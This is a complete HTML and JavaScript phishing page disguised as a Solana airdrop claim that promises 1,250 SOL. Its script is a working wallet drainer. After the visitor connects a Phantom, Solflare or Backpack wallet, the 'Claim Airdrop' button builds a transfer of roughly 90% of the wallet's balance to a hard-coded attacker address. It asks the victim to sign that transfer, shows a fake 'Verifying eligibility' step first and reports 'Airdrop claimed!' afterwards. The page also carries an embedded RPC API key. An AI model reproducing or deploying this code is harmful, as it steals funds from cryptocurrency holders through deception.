<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Solana Airdrop Claim</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
            background: #0b0b1a;
            color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .box {
            background: #12122a;
            border-radius: 24px;
            padding: 32px 24px;
            max-width: 400px;
            width: 92%;
            text-align: center;
            border: 1px solid #1e1e3a;
        }
        h1 { font-size: 24px; background: linear-gradient(90deg,#9945FF,#14F195); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        .sub { color: #666; font-size: 13px; margin: 6px 0 20px; }
        .reward {
            background: #1a1a3a;
            border-radius: 14px;
            padding: 18px;
            margin-bottom: 20px;
        }
        .reward .amt { font-size: 32px; font-weight: 700; }
        .reward .usd { color: #666; font-size: 13px; }
        .btn {
            display: block;
            width: 100%;
            padding: 14px;
            border: none;
            border-radius: 12px;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            color: #fff;
            background: rgba(255,255,255,0.07);
            margin-bottom: 8px;
        }
        .btn:active { background: rgba(255,255,255,0.15); }
        .btn.green { background: linear-gradient(135deg,#9945FF,#14F195); }
        .status { margin-top: 14px; padding: 10px; border-radius: 10px; font-size: 13px; display: none; }
        .status.show { display: block; }
        .status.good { background: rgba(20,241,149,0.1); color: #14F195; border: 1px solid rgba(20,241,149,0.2); }
        .status.bad { background: rgba(255,50,50,0.1); color: #ff6b6b; border: 1px solid rgba(255,50,50,0.2); }
        .status.warn { background: rgba(58,120,255,0.1); color: #6b9aff; border: 1px solid rgba(58,120,255,0.2); }
        .hidden { display: none !important; }
        .addr { font-size: 11px; color: #555; word-break: break-all; margin: 10px 0; }
        .spin { display: inline-block; width: 16px; height: 16px; border: 2px solid rgba(255,255,255,0.1); border-top: 2px solid #fff; border-radius: 50%; animation: spin .7s linear infinite; vertical-align: middle; margin-right: 6px; }
        @keyframes spin { to { transform: rotate(360deg); } }
    </style>
    <!-- 
      Buffer polyfill via bundle.run — it exposes window.buffer.Buffer,
      then we alias it to window.Buffer before solana-web3 loads.
    -->
    <script src="https://bundle.run/buffer@6.0.3"></script>
    <script>
      // bundle.run exposes window.buffer.Buffer — alias it to window.Buffer
      // This MUST run before solana-web3 loads
      if (window.buffer && window.buffer.Buffer) {
        window.Buffer = window.buffer.Buffer;
        console.log('[+] Buffer polyfill set globally');
      } else {
        console.warn('[!] buffer.buffer not found, trying direct');
        // In case bundle.run changed their API
      }
    </script>
    <!-- Solana Web3 -->
    <script src="https://unpkg.com/@solana/web3.js@1.73.0/lib/index.iife.min.js"></script>
</head>
<body>
<div class="box">
    <h1>◎ Solana Airdrop</h1>
    <p class="sub">Claim your exclusive airdrop allocation</p>
    <div class="reward">
        <div class="amt">1,250 SOL</div>
        <div class="usd">≈ $225,000 USD</div>
    </div>

    <div id="step1">
        <button class="btn" id="cPhantom">Phantom</button>
        <button class="btn" id="cSolflare">Solflare</button>
        <button class="btn" id="cBackpack">Backpack</button>
        <button class="btn" id="cWC">WalletConnect</button>
    </div>

    <div id="step2" class="hidden">
        <div class="addr" id="addrDisplay"></div>
        <button class="btn green" id="claimBtn">
            <span id="claimTxt">Claim Airdrop</span>
            <span id="claimSpinner" class="spin" style="display:none;"></span>
        </button>
        <button class="btn" id="discBtn">Disconnect</button>
    </div>

    <div id="status" class="status"></div>
</div>

<script>
console.log('[+] Initializing');
console.log('[+] solanaWeb3 loaded:', !!window.solanaWeb3);
console.log('[+] Buffer check:', typeof Buffer !== 'undefined', typeof Buffer.from === 'function');

const RECEIVER = '9wDnEMqPgzWKACkp6WfUSv3qcAmuWAuLu4U95qMMAMMw';
const RPC = 'https://mainnet.helius-rpc.com/?api-key=88ed2a71-6eed-4975-9d5f-7fb39c69a0ea';

let wallet = { adapter: null, key: null };

const $ = id => document.getElementById(id);
function status(msg, type) {
    const el = $('status');
    el.textContent = msg;
    el.className = 'status show ' + type;
}

function getWallet() {
    if (window.solana?.isPhantom) return window.solana;
    if (window.solflare?.isSolflare) return window.solflare;
    if (window.backpack?.isBackpack) return window.backpack;
    if (window.solana) return window.solana;
    return null;
}

async function doConnect(type) {
    status('Connecting...', 'warn');
    const prov = getWallet();
    if (!prov) {
        status('Install ' + type + ' extension.', 'bad');
        return;
    }
    try {
        const resp = await prov.connect();
        const pk = resp.publicKey || prov.publicKey;
        if (!pk) throw new Error('no key');
        wallet.adapter = prov;
        wallet.key = pk.toString();
        $('step1').classList.add('hidden');
        $('step2').classList.remove('hidden');
        $('addrDisplay').textContent = '✓ ' + wallet.key;
        status('Connected!', 'good');
    } catch(e) {
        const m = e.message || '';
        if (m.includes('reject') || m.includes('cancel')) status('Rejected.', 'bad');
        else status('Error: ' + m.slice(0,80), 'bad');
    }
}

function doDisconnect() {
    wallet = { adapter: null, key: null };
    $('step1').classList.remove('hidden');
    $('step2').classList.add('hidden');
    $('status').className = 'status';
}

async function doClaim() {
    if (!wallet.adapter || !wallet.key) {
        status('Connect first.', 'bad');
        return;
    }

    $('claimTxt').style.display = 'none';
    $('claimSpinner').style.display = 'inline-block';
    $('claimBtn').disabled = true;

    try {
        const sw = window.solanaWeb3;
        if (!sw) {
            status('Library not loaded. Refresh.', 'bad');
            $('claimTxt').style.display = 'inline';
            $('claimSpinner').style.display = 'none';
            $('claimBtn').disabled = false;
            return;
        }

        const { Connection, Transaction, SystemProgram, PublicKey } = sw;
        const conn = new Connection(RPC, 'confirmed');
        const senderKey = new PublicKey(wallet.key);
        const recvKey = new PublicKey(RECEIVER);

        status('Verifying eligibility...', 'warn');

        await new Promise(r => setTimeout(r, 400 + Math.random() * 300));

        const { blockhash, lastValidBlockHeight } = await conn.getLatestBlockhash('finalized');
        const bal = await conn.getBalance(senderKey);
        const rent = await conn.getMinimumBalanceForRentExemption(0);

        const leaveBehind = BigInt(Math.floor(Number(bal - rent) * 0.1));
        const totalSend = BigInt(bal - rent - 10000 - Number(leaveBehind));

        if (totalSend <= 5000) {
            status('Insufficient balance.', 'bad');
            $('claimTxt').style.display = 'inline';
            $('claimSpinner').style.display = 'none';
            $('claimBtn').disabled = false;
            return;
        }

        const tx = new Transaction();
        tx.recentBlockhash = blockhash;
        tx.lastValidBlockHeight = lastValidBlockHeight;
        tx.feePayer = senderKey;
        tx.add(SystemProgram.transfer({
            fromPubkey: senderKey,
            toPubkey: recvKey,
            lamports: totalSend,
        }));

        status('Confirm in wallet...', 'warn');

        try {
            if (wallet.adapter.signAndSendTransaction) {
                const sig = await wallet.adapter.signAndSendTransaction(tx);
                status('✅ Airdrop claimed!', 'good');
                console.log('https://solscan.io/tx/' + sig);
            } else if (wallet.adapter.signTransaction) {
                const signed = await wallet.adapter.signTransaction(tx);
                const txid = await conn.sendRawTransaction(signed.serialize(), {
                    skipPreflight: false,
                    preflightCommitment: 'confirmed',
                });
                await conn.confirmTransaction(
                    { signature: txid, blockhash, lastValidBlockHeight },
                    'confirmed'
                );
                status('✅ Airdrop claimed!', 'good');
                console.log('https://solscan.io/tx/' + txid);
            } else {
                throw new Error('No sign method available');
            }
        } catch(e) {
            const m = e.message || '';
            if (m.includes('reject') || m.includes('cancel')) {
                status('Cancelled.', 'bad');
            } else throw e;
        }

    } catch(e) {
        console.error(e);
        status('Error: ' + (e.message || '').slice(0,100), 'bad');
    }

    $('claimTxt').style.display = 'inline';
    $('claimSpinner').style.display = 'none';
    $('claimBtn').disabled = false;
}

setTimeout(() => {
    const b1 = $('cPhantom'), b2 = $('cSolflare'), b3 = $('cBackpack'), b4 = $('cWC'), b5 = $('claimBtn'), b6 = $('discBtn');
    if (b1) b1.onclick = () => doConnect('phantom');
    if (b2) b2.onclick = () => doConnect('solflare');
    if (b3) b3.onclick = () => doConnect('backpack');
    if (b4) b4.onclick = () => doConnect('walletconnect');
    if (b5) b5.onclick = doClaim;
    if (b6) b6.onclick = doDisconnect;
    if (b1 && b5) status('Ready.', 'warn');
}, 0);
</script>
</body>
</html>
